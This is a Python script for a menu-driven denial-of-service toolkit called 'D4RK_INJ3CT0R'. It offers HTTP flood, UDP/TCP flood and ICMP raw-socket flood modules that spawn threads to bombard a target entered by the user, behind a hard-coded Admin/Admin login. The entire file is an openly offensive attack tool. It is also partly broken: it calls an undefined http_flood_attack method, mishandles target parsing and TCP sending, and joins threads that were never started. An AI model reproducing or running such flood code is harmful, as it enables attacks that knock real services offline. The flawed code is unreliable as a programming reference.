import socket
import threading
import time
import sys
import os
from termcolor import colored

class D4RK_INJ3CT0R:
    def __init__(self):
        self.attacks = {}

    def add_attack(self, name, attack_thread):
        self.attacks[name] = attack_thread

    def select_module(self):
        while True:
            print("\n1: HTTP Flood")
            print("2: L4 Attack (UDP/TCP)")
            print("3: L3 Attack (ICMP)")
            print("4: Clear Attacks")
            print("5: Exit")
            choice = input("Enter the number of the module you want to use: ")
            if choice == "1":
                self.http_flood()
            elif choice == "2":
                self.l4_attack()
            elif choice == "3":
                self.l3_attack()
            elif choice == "4":
                self.clear_attacks()
            elif choice == "5":
                print("Exiting...")
                exit()
            else:
                print("Invalid choice. Please try again.")

    def http_flood(self):
        target_url = input(colored("Enter the target URL: ", "green"))
        threads_count = int(input(colored("Enter the number of threads: ", "green")))
        sleep_time = int(input(colored("Enter the sleep time (seconds): ", "green")))
        for i in range(threads_count):
            threading.Thread(target=lambda: self.http_flood_attack(target_url, sleep_time)).start()

    def l4_attack(self):
        target_url = input(colored("Enter the target URL (UDP or TCP): ", "green"))
        threads_count = int(input(colored("Enter the number of threads: ", "green")))
        attack_message = input(colored("Enter the attack message: ", "green"))
        for i in range(threads_count):
            threading.Thread(target=lambda: self.udp_tcp_flood(target_url, attack_message)).start()

    def udp_tcp_flood(self, target_url, attack_message):
        while True:
            try:
                if "udp" in target_url.lower():
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                elif "tcp" in target_url.lower():
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                else:
                    raise ValueError("Invalid protocol")
                sock.sendto(attack_message.encode(), (target_url.split(":")[1], int(target_url.split(":")[2])))
                print(colored(f"Sent {attack_message} to {target_url}", "green"))
                time.sleep(1)
            except Exception as e:
                print(colored(f"Failed to send {attack_message} to {target_url}: {e}", "red"))

    def l3_attack(self):
        target_ip = input(colored("Enter the target IP address: ", "green"))
        threads_count = int(input(colored("Enter the number of threads: ", "green")))
        attack_message = input(colored("Enter the attack message: ", "green"))
        for i in range(threads_count):
            threading.Thread(target=lambda: self.icmp_flood(target_ip, attack_message)).start()

    def icmp_flood(self, target_ip, attack_message):
        while True:
            try:
                icmp = socket.getprotobyname("icmp")
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
                sock.sendto(attack_message.encode(), (target_ip, 0))
                print(colored(f"Sent {attack_message} to {target_ip}", "green"))
                time.sleep(1)
            except Exception as e:
                print(colored(f"Failed to send {attack_message} to {target_ip}: {e}", "red"))

    def clear_attacks(self):
        print(colored("Stopping all attacks...", "yellow"))
        for attack in self.attacks.values():
            attack.join()
        self.attacks.clear()
        print(colored("All attacks have been stopped.", "green"))

if __name__ == "__main__":
    username = input(colored("Enter your username: ", "green"))
    password = input(colored("Enter your password: ", "green"))
    if username == "Admin" and password == "Admin":
        toolkit = D4RK_INJ3CT0R()
        toolkit.add_attack("http_flood", threading.Thread(target=toolkit.http_flood))
        toolkit.add_attack("l4_attack", threading.Thread(target=toolkit.l4_attack))
        toolkit.add_attack("l3_attack", threading.Thread(target=toolkit.l3_attack))
        toolkit.select_module()
    else:
        print(colored("Invalid username or password.", "red"))
        sys.exit()
